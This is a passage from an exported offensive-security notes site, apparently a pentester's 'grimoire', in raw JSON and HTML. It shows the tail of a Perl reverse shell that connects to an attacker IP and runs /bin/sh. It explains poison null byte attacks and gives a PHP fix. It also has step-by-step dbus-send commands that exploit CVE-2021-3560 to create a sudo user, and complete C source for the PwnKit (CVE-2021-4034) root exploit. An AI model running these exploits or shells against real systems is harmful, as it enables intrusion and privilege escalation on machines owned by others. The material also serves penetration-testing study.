style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;));&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;if&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;connect&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;(S,sockaddr_in(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;attacker_port&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;, inet_aton(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;attacker_ip&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;)))){&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;\topen&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;STDIN&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;, &lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;&gt;&amp;#x26;S&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;);&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;\topen&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;STDOUT&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;, &lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;&gt;&amp;#x26;S&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;);&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;\topen&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;STDERR&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;, &lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;&gt;&amp;#x26;S&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;);&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;\texec&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;/bin/sh -i&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;);&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;};&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;Catch it with &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/netcat&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/netcat&quot;&gt;netcat&lt;/a&gt; or &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/socat&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/socat&quot;&gt;socat&lt;/a&gt;.&lt;/p&gt;"},"spells/Poison-null-byte-attack":{"slug":"spells/Poison-null-byte-attack","filePath":"spells/Poison null byte attack.md","title":"Poison null byte attack","links":["spells/Poison-null-byte-in-PHP"],"tags":["AttackCycle/Exploitation/NullByteAttacks"],"content":"Some languages use null bytes (0x00) to know when a string terminates, rather than tracking the actual string length. If a null byte (generally? always? encoded as %00) is included in a string, then everything after that byte is dropped by the interpreter.\nBecause % characters are themselves special, null bytes need to be encoded in URLs as %2500.\nTypically a null byte will either be inserted at the end of a string (to prevent a suffix from being appended or bypass simple path filters) or before a “fake” file extensions (which can cause some file-type checks to pass, again allowing us to download files we’d otherwise be denied access to).\nPHP\nTransclude of Poison-null-byte-in-PHP","richContent":"&lt;p&gt;Some languages use null bytes (0x00) to know when a string terminates, rather than tracking the actual string length. If a null byte (generally? always? encoded as %00) is included in a string, then everything after that byte is dropped by the interpreter.&lt;/p&gt;\n&lt;p&gt;Because % characters are themselves special, null bytes need to be encoded in URLs as %2500.&lt;/p&gt;\n&lt;p&gt;Typically a null byte will either be inserted at the end of a string (to prevent a suffix from being appended or bypass simple path filters) or before a “fake” file extensions (which can cause some file-type checks to pass, again allowing us to download files we’d otherwise be denied access to).&lt;/p&gt;\n&lt;h2 id=&quot;php&quot;&gt;PHP&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#php&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;&lt;/p&gt;&lt;blockquote class=&quot;transclude&quot; data-url=&quot;Poison-null-byte-in-PHP&quot; data-block=&quot;&quot; data-embed-alias=&quot;Poison null byte in PHP&quot;&gt;&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Poison-null-byte-in-PHP&quot; class=&quot;transclude-inner internal alias&quot; data-slug=&quot;spells/Poison-null-byte-in-PHP&quot;&gt;Transclude of Poison-null-byte-in-PHP&lt;/a&gt;&lt;/blockquote&gt;&lt;p&gt;&lt;/p&gt;"},"spells/Poison-null-byte-in-PHP":{"slug":"spells/Poison-null-byte-in-PHP","filePath":"spells/Poison null byte in PHP.md","title":"Poison null byte in PHP","links":["spells/Poison-null-byte-attack"],"tags":["AttackCycle/Exploitation/NullByteAttacks","Language/PHP"],"content":"String parsing for PHP &lt; 5.3.4 is susceptible to the poison null byte.\nThe best way to defend against these attacks is to simply sanitize strings by explicitly removing any null bytes they contain.\n$sanitized_string = str_replace(chr(0), &#039;&#039;, $original_string);  ","richContent":"&lt;p&gt;String parsing for &lt;a href=&quot;https://defendtheweb.net/article/common-php-attacks-poison-null-byte&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;PHP &amp;#x3C; 5.3.4 is susceptible&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; to the &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Poison-null-byte-attack&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Poison-null-byte-attack&quot;&gt;poison null byte&lt;/a&gt;.&lt;/p&gt;\n&lt;p&gt;The best way to &lt;a href=&quot;https://defendtheweb.net/article/common-php-attacks-poison-null-byte&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;defend against these attacks&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; is to simply sanitize strings by explicitly removing any null bytes they contain.&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;php&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;php&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;sanitized_string&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; =&lt;/span&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt; str_replace&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;chr&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt;0&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;),&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &#039;&#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; $&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;original_string&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;);&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;  &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;"},"spells/Polkit":{"slug":"spells/Polkit","filePath":"spells/Polkit.md","title":"Polkit","links":["spells/sudo"],"tags":["OS/Linux/Polkit","AttackCycle/PrivEsc"],"content":"CVE-2021-3560\nThis bug is a combination of a race condition and bad error handling. Basically:\n\nManually request an action that requires superuser access via DBus.\nKill dbus-daemon after Polkit has received the message but before it responds (there’s the race).\nPolkit requests the user ID associated with the message, but since DBus has restarted it can’t reference the original message ID and responds with an error.\nPolkit mishandles the error, substituting 0 for the ID of the requesting user (there’s the botched error handling).\nBecause the requesting user ID now appears to be root, Polkit just goes ahead and takes the action without issuing a challenge.\n\nUbuntu fixed with with version 0.105-26ubuntu1.1 of the policykit-1 package (the last vulnerable version was 0.105-26ubuntu1).\n\n\nConstruct a message similar to the following:\ndbus-send \\\n\t--system \\\n\t--dest=org.freedesktop.Accounts \\\n\t--type=method_call \\\n\t--print-reply /org/freedesktop/Accounts \\\n\t              org.freedesktop.Accounts.CreateUser \\\n\t              string:attacker \\\n\t              string:&quot;Pentester Account&quot; \\\n\t              int32:1\nThe three parameters are:\n\nstring:attacker — the name of the user to create.\nstring:&quot;Pentester Account&quot; — the user “description” (GECOS field).\nint32:1 — grant sudo access to the user.\n\n\n\nBegin by determining how long the message takes to execute on the target. This can be done with the time command.\ntime dbus-send \\\n\t--system \\\n\t--dest=org.freedesktop.Accounts \\\n\t--type=method_call \\\n\t--print-reply /org/freedesktop/Accounts \\\n\t              org.freedesktop.Accounts.CreateUser \\\n\t              string:attacker \\\n\t              string:&quot;Pentester Account&quot; \\\n\t              int32:1\n\n\nDBus needs to be killed approximately halfway through this execution period. We cannot wait for the application to return, so instead we background it.\ndbus-send \\\n\t--system \\\n\t--dest=org.freedesktop.Accounts \\\n\t--type=method_call \\\n\t--print-reply /org/freedesktop/Accounts \\\n\t              org.freedesktop.Accounts.CreateUser \\\n\t              string:attacker \\\n\t              string:&quot;Pentester Account&quot; \\\n\t              int32:1 &amp; \\\nsleep ${TIME}s; kill $!\nHere $TIME is approximately half the time measured in the previous step.\n\n\nID the created user.\nid attacker\n\n\nCreate a new password hash for the user.\nopenssl passwd -6 $PASSWORD\n\n\nPull the same trick as in step 3, but with setting the created user’s password.\ndbus-send \\\n\t--system \\\n\t--dest=org.freedesktop.Accounts \\\n\t--type=method_call \\\n\t--print-reply /org/freedesktop/Accounts/User$UID \\\n\t              org.freedesktop.Accounts.User.SetPassword \\\n\t              string:&#039;$PASSWORD_HASH&#039; \\\n\t              string:&#039;Ask the pentester&#039; &amp; \\\nsleep ${TIME}s; kill $!\nHere $UID is the user ID retrieved in step 4 (note that there’s no space between User and the ID, so you’ll be hitting an endpoint that looks something like /org/freedesktop/Accounts/User1003), $PASSWORD_HASH is the hash returned in step 5, and $TIME is the same timing determined from step 3. The second string  being passed in the user password hint.\n\n\nLog in as the new user (probably via su).\n\n\nCVE-2021-4034 (“Pwnkit”)\nQuick-n-dirty Pwnkit exploit:\n/*\n * Proof of Concept for PwnKit: Local Privilege Escalation Vulnerability Discovered in polkit&#039;s pkexec (CVE-2021-4034) by Andris Raugulis &lt;moo@arthepsy.eu&gt;\n * Advisory: blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034\n */\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;unistd.h&gt;\n \nchar *shell = \n\t&quot;#include &lt;stdio.h&gt;\\n&quot;\n\t&quot;#include &lt;stdlib.h&gt;\\n&quot;\n\t&quot;#include &lt;unistd.h&gt;\\n\\n&quot;\n\t&quot;void gconv() {}\\n&quot;\n\t&quot;void gconv_init() {\\n&quot;\n\t&quot;\tsetuid(0); setgid(0);\\n&quot;\n\t&quot;\tseteuid(0); setegid(0);\\n&quot;\n\t&quot;\tsystem(\\&quot;export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; rm -rf &#039;GCONV_PATH=.&#039; &#039;pwnkit&#039;; /bin/sh\\&quot;);\\n&quot;\n\t&quot;\texit(0);\\n&quot;\n\t&quot;}&quot;;\n \nint main(int argc, char *argv[]) {\n\tFILE *fp;\n\tsystem(&quot;mkdir -p &#039;GCONV_PATH=.&#039;; touch &#039;GCONV_PATH=./pwnkit&#039;; chmod a+x &#039;GCONV_PATH=./pwnkit&#039;&quot;);\n\tsystem(&quot;mkdir -p pwnkit; echo &#039;module UTF-8// PWNKIT// pwnkit 2&#039; &gt; pwnkit/gconv-modules&quot;);\n\tfp = fopen(&quot;pwnkit/pwnkit.c&quot;, &quot;w&quot;);\n\tfprintf(fp, &quot;%s&quot;, shell);\n\tfclose(fp);\n\tsystem(&quot;gcc pwnkit/pwnkit.c -o pwnkit/pwnkit.so -shared -fPIC&quot;);\n\tchar *env[] = { &quot;pwnkit&quot;, &quot;PATH=GCONV_PATH=.&quot;, &quot;CHARSET=PWNKIT&quot;, &quot;SHELL=pwnkit&quot;, NULL };\n\texecve(&quot;/usr/bin/pkexec&quot;, (char*[]){NULL}, env);\n}\nThe exploit is then as simple as gcc $FILE -o exploit; ./exploit.\n\n\n                  \n                  Caution\n                  \n                \n\n\nThis version of the exploit will leave traces in the target’s logs!\n\n\n\nHere’s what happens on execution:\n\n\nThe exploit creates the path GCONV_PATH=. in the current directory and adds an invalid executable file to it.\n\n\nThe exploit creates a second directory called pwnkit and sets up a malicious shared library designed to be loaded by GLib to translate system messages to the made-up character set “PWNKIT”.\n\n\nThe exploit calls pkexec with a NULL argument list (this bit is important, since we need the length of the argument list to be 0 — so, not even to contain the name of pkexec itself) but with a correctly set up (albeit malicious) environment via execve(). Importantly, the first “variable” in the environment is actually the name of the (invalid) executable in the GCONV_PATH=. directory.\n\n\nPolkit just falls through the loop that it would normally use to walk through the passed-in arguments. This causes what would be pointing to an executable name to instead point to the first environment variable that’s passed into execve(), which happens to be string pwnkit.\n\n\nPolkit looks up the malicious executable, finds it in GCONV_PATH=./pwnkit (because we set the PATH to that directory), and then tries to replace the executable name with this full path. Except that it’s still writing to the first element of the environment, which causes pwnkit to be replaced by GCONV_PATH=./pwnkit.\n\n\nPolkit the proceeds to sanitize its environment. When it comes to the invalid SHELL variable this sanitization fails and Polkit throws an error and dies. But! Before dying, Polkit tries to print the error using a GLib function that dutifully attempts to translate the message into the “PWNKIT” character set. To figure out how to do this, modules are loaded from GCONV_PATH… And we’ve defined a malicious module to do this that cleans up the exploit files and spawns a root shell (since pkexec is SUID root).\n\n","richContent":"&lt;h2 id=&quot;cve-2021-3560&quot;&gt;CVE-2021-3560&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#cve-2021-3560&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;This bug is a combination of a race condition and bad error handling. Basically:&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;Manually request an action that requires superuser access via DBus.&lt;/li&gt;\n&lt;li&gt;Kill dbus-daemon &lt;em&gt;after&lt;/em&gt; Polkit has received the message but &lt;em&gt;before&lt;/em&gt; it responds (there’s the race).&lt;/li&gt;\n&lt;li&gt;Polkit requests the user ID associated with the message, but since DBus has restarted it can’t reference the original message ID and responds with an error.&lt;/li&gt;\n&lt;li&gt;Polkit mishandles the error, substituting 0 for the ID of the requesting user (there’s the botched error handling).&lt;/li&gt;\n&lt;li&gt;Because the requesting user ID now appears to be root, Polkit just goes ahead and takes the action without issuing a challenge.&lt;/li&gt;\n&lt;/ul&gt;\n&lt;p&gt;Ubuntu fixed with with version 0.105-26ubuntu1.1 of the policykit-1 package (the last vulnerable version was 0.105-26ubuntu1).&lt;/p&gt;\n&lt;ol&gt;\n&lt;li&gt;\n&lt;p&gt;Construct a message similar to the following:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;dbus-send&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;\t--system&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;\t--dest=org.freedesktop.Accounts&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;\t--type=method_call&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;\t--print-reply&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /org/freedesktop/Accounts&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;\t              org.freedesktop.Accounts.CreateUser&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;\t              string:attacker&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;\t              string:&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;Pentester Account&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;\t              int32:1&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;The three parameters are:&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;code&gt;string:attacker&lt;/code&gt; — the name of the user to create.&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;string:&quot;Pentester Account&quot;&lt;/code&gt; — the user “description” (GECOS field).&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;int32:1&lt;/code&gt; — grant &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/sudo&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/sudo&quot;&gt;sudo&lt;/a&gt; access to the user.&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;li&gt;\n&lt;p&gt;Begin by determining how long the message takes to execute on the target. This can be done with the &lt;code&gt;time&lt;/code&gt; command.&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;time&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; dbus-send &lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;\\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;\t--system&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;\t--dest=org.freedesktop.Accounts&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;\t--type=method_call&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;\t--print-reply&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /org/freedesktop/Accounts&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;\t              org.freedesktop.Accounts.CreateUser&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;\t              string:attacker&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;\t              string:&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;Pentester Account&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;\t              int32:1&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;/li&gt;\n&lt;li&gt;\n&lt;p&gt;DBus needs to be killed approximately &lt;em&gt;halfway&lt;/em&gt; through this execution period. We &lt;em&gt;cannot&lt;/em&gt; wait for the application to return, so instead we background it.&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light 